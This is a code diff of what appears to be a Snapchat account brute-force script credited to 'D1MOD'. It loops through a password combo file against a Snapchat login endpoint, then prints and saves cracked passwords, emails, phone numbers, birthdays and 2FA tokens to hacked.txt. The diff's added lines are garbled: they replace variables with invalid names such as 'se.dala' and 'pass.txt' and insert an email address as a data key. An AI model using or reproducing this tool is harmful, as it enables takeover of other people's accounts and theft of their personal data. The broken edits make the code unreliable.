@@ -46,10 +46,10 @@ d1mod = input (red_color + '''
 
 
 if d1mod == "1":
-  user = input("USERNAME OF SNAPCHAT => ")
-  flo = input("FILE PASSWORD (COMBO) => ")
+  user = input("USERNAME OF SNAPCHAT => ") se.dala
+  flo = input("FILE PASSWORD (COMBO) => ") pass.txt
 
-  url = "https://gcp.api.snapchat.com/scauth/login"
+  url = "https://gcp.api.snapchat.com/se.dala/login"
 
   password = open(flo).read().splitlines()
 
@@ -72,8 +72,8 @@ if d1mod == "1":
         if 'updates_response' in response:
             try:
                 print(red_color+"---------------------------------------")
-                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> FNISH HACKED BY D1MOD '))
-                print(green_color +" --> Email : "+str(info["updates_response"]["email"]))
+                print((green_color + 'username : ' + se.dala + ' | password : ' + pass.txt + ' --> FNISH HACKED BY D1MOD '))
+                print(green_color +" --> Email : "+str(info["updates_response"]["fadi.themagic217@gmai.com"]))
                 print(green_color +" --> mobile : "+str(info["updates_response"]["mobile"]))
                 print(green_color +" --> birthday : "+str(info["updates_response"]["birthday"]))
                 with open('hacked.txt', 'a') as x:
@@ -84,7 +84,7 @@ if d1mod == "1":
         if 'two_fa_needed' in response:
             try:
                 print(red_color+"---------------------------------------")
-                print((green_color + 'username : ' + user + ' | password : ' + password + ' --> HACKED BY D1MOD -> FUCKING 2FA '))
+                print((green_color + 'username : ' + se.dala + ' | password : ' + pass.txt + ' --> HACKED BY D1MOD -> FUCKING 2FA '))
                 print(green_color +" --> number 2FA : "+str(info["is_sms_two_fa_enabled"]))
                 print(green_color +" --> token 2FA : "+str(info["pre_auth_token"]))
                 print(green_color +" --> number 2FA : "+str(info["phone_number"]))
@@ -95,7 +95,7 @@ if d1mod == "1":
                 exit()
         elif 'logged' in response:
                 print(red_color+"---------------------------------------")
-                print((red_color + '' + user + ':' + password + ' --> Error '))
+                print((red_color + '' + se.dala + ':' + pass.txt + ' --> Error '))
 
 if d1mod == "2":
   ketik ("\033[1;33m MADE BY D1MOD1877 https://www.d1modev.ml/....\033[1;33m")
